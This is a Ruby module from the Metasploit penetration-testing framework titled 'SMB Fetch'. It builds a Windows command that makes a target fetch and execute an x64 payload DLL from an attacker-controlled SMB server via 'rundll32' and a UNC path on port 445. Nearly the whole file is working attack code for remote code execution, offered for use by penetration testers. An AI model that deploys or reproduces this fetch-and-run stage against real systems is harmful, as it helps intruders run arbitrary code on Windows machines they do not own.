##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter::Fetch::SMB

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SMB Fetch',
        'Description' => 'Fetch and execute an x64 payload from an SMB server.',
        'Author' => 'Spencer McIntyre',
        'Platform' => 'win',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_X64,
        'AdaptedPlatform' => 'win'
      )
    )
    deregister_options('FETCH_DELETE', 'FETCH_SRVPORT', 'FETCH_WRITABLE_DIR', 'FETCH_FILENAME')
  end

  def srvport
    445 # UNC paths for SMB services *must* be 445
  end

  def generate_fetch_commands
    "rundll32 #{unc},0"
  end

  # generate a DLL instead of an EXE
  alias generate_payload_exe generate_payload_dll
end
